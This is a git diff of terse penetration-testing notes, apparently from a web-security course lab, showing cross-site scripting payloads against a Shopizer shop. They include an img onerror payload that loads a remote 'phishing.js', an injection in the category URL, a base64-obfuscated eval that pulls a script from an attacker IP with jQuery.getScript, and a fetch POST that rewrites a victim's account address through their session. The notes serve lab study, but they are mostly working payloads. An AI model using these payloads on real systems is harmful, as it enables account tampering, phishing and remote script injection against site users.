@@ -193,3 +193,55 @@ fetch("login").then(res => res.text().then(data => {
 Fetch only brings the content. But does not execute. so we are creating script element.
  
  <img src=x onerror="const script = document.createElement('script');script.src = 'http://192.168.49.57/phishing.js';script.async = true;document.body.appendChild(script);">
+
+
+#### Shopizer
+
+http://shopizer:8080/shop/category/handbags.html/ref=c:2'+alert(1)+'canary
+
+
+c:2'+alert(1)+'canary
+
+>>>>cat ~/xss/xss.js
+alert('It worked!');
+
+ jQuery.getScript('http://192.168.49.57/xss.js') 
+ eval(atob(encoded data))
+ 
+ '+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTcveHNzLmpzJyk='))+'
+ 
+ Better solution:
+ '+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTcveHNzLmpzJyk=')))+'
+ 
+ ------
+ 1
+(PortSwigger, 2021), https://portswigger.net/burp/documentation/desktop/tools/target/site-map ↩︎
+
+2
+(Wikipedia, 2021), https://en.wikipedia.org/wiki/JQuery ↩︎
+
+3
+(jQuery, 2021), https://api.jquery.com/jquery.getscript/ ↩︎
+
+4
+(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Glossary/Base64 ↩︎
+
+5
+(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/atob ↩︎
+
+6
+(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval ↩︎
+
+-----
+
+fetch('http://shopizer:8080/shop/customer/updateAddress.html',{
+    method: 'POST',
+    mode: 'same-origin',
+    credentials: 'same-origin',
+    headers: {
+      'Content-Type':'application/x-www-form-urlencoded'
+    }, 
+    body:'customerId=&billingAddress=false&firstName=hax&lastName=hax&company=&address=hax&city=hax&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change address'
+  })
+  
+  -----
